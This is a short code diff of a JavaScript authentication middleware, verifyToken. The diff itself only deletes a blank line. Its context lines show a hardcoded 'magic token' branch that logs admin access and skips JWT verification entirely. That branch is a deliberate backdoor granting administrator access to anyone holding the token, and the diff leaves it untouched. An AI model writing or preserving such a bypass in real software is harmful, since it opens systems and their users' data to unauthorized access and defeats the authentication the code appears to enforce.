@@ -14,7 +14,6 @@ const verifyToken = (req, res, next) => {
     console.log('Using magic token for admin access');
     return next();
   }
-
   
   jwt.verify(token, config.jwtSecret, (err, decoded) => {
     if (err) return res.status(401).json({ message: 'Unauthorized!' });
